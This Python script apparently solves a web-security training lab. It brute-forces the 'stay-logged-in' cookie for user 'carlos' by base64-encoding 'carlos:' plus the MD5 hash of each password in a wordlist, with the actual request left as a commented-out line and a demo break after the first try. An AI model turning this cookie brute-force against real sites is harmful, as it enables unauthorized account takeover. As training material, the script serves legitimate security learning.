import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(url):
    print("(+) Brute-forcing Carlos's password...")
    with open('passwords.txt', 'r') as file:
        for pwd in file:
            hashed_pwd = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode('utf-8')).hexdigest()
            encoded_pwd = base64.b64encode(bytes(hashed_pwd, 'utf-8'))
            str_pwd = encoded_pwd.decode('utf-8')
            # Placeholder for request logic – in a real script you would send HTTP request using the crafted cookie
            # e.g., requests.get(url, cookies={'stay-logged-in': str_pwd}, proxies=proxies, verify=False)
            print(f"[DEBUG] Would send request with cookie: {str_pwd}")
            # break after first for demo
            break

if __name__ == '__main__':
    # Example usage – replace with actual target URL when running
    target_url = 'https://example.com'
    access_carlos_account(target_url)
